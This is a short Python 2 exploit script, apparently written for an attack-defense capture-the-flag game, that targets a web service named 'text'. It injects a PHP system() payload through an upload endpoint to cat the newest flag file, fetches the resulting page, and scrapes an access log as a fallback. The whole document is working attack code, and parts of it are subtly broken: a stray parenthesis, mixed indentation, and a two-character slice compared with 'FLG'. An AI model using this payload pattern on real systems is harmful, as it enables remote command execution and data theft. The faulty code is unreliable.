from exploit_base import Exploit
import requests

class Exploit_Text(Exploit):
	def __init__(self):
		self.service_name = "text"
		self.port_number = 20093
	
	def exploit(self, ip, porti, flag_id):
                port = str(porti)
		print "Exploit text: IP: "+ip+" @Port: "+port+" -- Flag_ID: "+ flag_id
                r = requests.get('http://' + ip + ':' + port + '/uploadFile.php?text=' + '<?php system("cat `ls -t ../rw/' + flag_id + '_*|head -n1`");?>', timeout=5))
                print r.text
                follow = r.text.split('href = "')[1]
                follow = follow.split('"')[0]
                r = requests.get('http://' + ip + ':' + port + '/' + follow, timeout=5)
                flag = r.text #should be flag
                print flag
                r = requests.get('http://' + ip + ':' + port + '/viewFile.php?file=access.log', timeout=5)
                print 'getting logs'
                flags = r.text.split('=FLG')
                f2 = flags[-1].split(' ')[0]
                print f2
                if flag[0:2] != 'FLG':
                    flag = 'FLG' + f2
                return flag
